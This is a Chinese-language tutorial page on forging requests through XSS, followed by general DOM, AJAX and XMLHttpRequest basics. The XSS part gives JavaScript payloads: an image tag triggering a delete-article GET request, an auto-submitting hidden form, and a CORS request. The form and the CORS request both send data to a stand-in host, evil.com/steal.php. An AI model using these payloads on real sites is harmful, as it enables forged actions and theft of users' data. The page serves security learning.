---
layout: default
---
# ![](../img/hj.jpg)XSS模拟发送请求

## ![](../img/github1.png)模拟发送GET请求
发送一个删除文章的get请求：
```
var img=document.createElement("img");
img.src="http://删除文章的api链接“；
document.body.appendChild(img);
```
## ![](../img/github2.png)模拟发送POST请求
### DOM节点法
通过js最终发出一条消息：
构造一个form表单，然后自动提交
```
var f = document.createElement（“form”）;
f.action="http://www.evil.com/steal.php";			//可修改
f.method="post";
document.body.appendChild(f);

var i1 = document.createElement("input");
il.name="ck";													//可修改
il.value="hijack";												//可修改
f.appendChild(il);

var i2 = document.createElement("input");
i2.name="mb_text";										//可修改
i2.value="thisisatest";										//可修改
f.appendChild(i2);
f.submit();
```


## ![](../img/github3.png)DOM树操作
### document.getElementById('id号').innerHTML;
举例：
```
<html>
<head></head>
<body>

<div id ='world'></div>
<div id = 'hello'>我是要获取的数据</div>

</body>
</html>
则要获取的数据=document.getElementById('hello').innerHTML
innerHTML表示设置或返回标签对象内的HTML数据
```
### document.getElementByTagName('div')\[1\].innerHTML;

>小贱提示：从上往下数，从0开始数

### 获取URL网址：window.location或location

### ajax

>小贱提示：
>
>AJAX = 异步 JavaScript 和 XML。
>
>AJAX 是一种用于创建快速动态网页的技术。可以在不重新加载整个网页的情况下，对网页的某部分进行更新

ajax 举例：

div 部分用于显示来自服务器的信息。当按钮被点击时，它负责调用名为 loadXMLDoc() 的函数：
```
<html>
<body>
<div id="myDiv"><h3>Let AJAX change this text</h3></div>
<button type="button" onclick="loadXMLDoc()">Change Content</button>
</body>
</html>
```

在页面的 head 部分添加一个 \<script> 标签。该标签中包含了这个 loadXMLDoc() 函数：

```
<head>
<script type="text/javascript">
function loadXMLDoc()
{
.... AJAX script goes here ...
}
</script>
</head>
```
### XMLHttpRequest
XHR创建对象
```
所有现代浏览器（IE7+、Firefox、Chrome、Safari 以及 Opera）均内建 XMLHttpRequest 对象。
创建 XMLHttpRequest 对象的语法：
variable=new XMLHttpRequest();
老版本的 Internet Explorer （IE5 和 IE6）使用 ActiveX 对象：
variable=new ActiveXObject("Microsoft.XMLHTTP");

为了应对所有的现代浏览器，包括 IE5 和 IE6，请检查浏览器是否支持 XMLHttpRequest 对象。如果支持，则创建 XMLHttpRequest 对象。如果不支持，则创建 ActiveXObject ：
var xmlhttp;
if (window.XMLHttpRequest)
  {// code for IE7+, Firefox, Chrome, Opera, Safari
  xmlhttp=new XMLHttpRequest();
  }
else
  {// code for IE6, IE5
  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
  }
```
XHR请求

如需将请求发送到服务器，我们使用 XMLHttpRequest 对象的 open() 和 send() 方法：

xmlhttp.open(method,url,Async)      举例：
```
xmlhttp.open("GET","text1.txt",true)；xmlhttp.send();
```
Async=true：异步,XMLHttpRequest 对象如果要用于 AJAX 的话，其 open() 方法的 async 参数必须设置为 true：
此时需要规定在响应处于 onreadystatechange 事件中的就绪状态时执行的函数：
Async=false：同步（不推荐）

举例：
get请求：
```
xmlhttp.onreadystatechange=function()
  {
  if (xmlhttp.readyState==4 && xmlhttp.status==200)
    {
    document.getElementById("myDiv").innerHTML=xmlhttp.responseText;//此处是自己可以修改的代码
    }
  }
xmlhttp.open("GET","demo_get2.asp?fname=Bill&lname=Gates",true);
xmlhttp.send();
```

post请求：
```
xmlhttp.onreadystatechange=function()
  {
  if (xmlhttp.readyState==4 && xmlhttp.status==200)
    {
    document.getElementById("myDiv").innerHTML=xmlhttp.responseText;//此处是自己可以修改的代码
    }
  }
xmlhttp.open("POST","ajax_test.asp",true);
xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded"); //添加http头
xmlhttp.send("fname=Bill&lname=Gates");
```
针对IE浏览器优化XMLHttpRequest：
```
<script>
function createCORSRequest(method,url){
  var xhr=new XMLHttpRequest();
  if("withCredentials" in xhr){
    xhr.open(method,url,true);}
  else if (typeof XDomainRequest != "undefined"){
    xhr=new XDomainRequest();
    xhr.open(method,url);}
  else {xhr=null;}
  return xhr;}


var request = createCORSRequest("get","http://www.evil.com/steal.php?data=456");
if (request){
  request.onload=function(){alert(request.responseText);};
  request.send();}
</script>
//如果是post，则request.send("fname=Bill&lname=Gates")
```

__原创文章，转载请注明转载自[http://www.8pwn.com](http://www.8pwn.com)__

[返回上一层](./web)
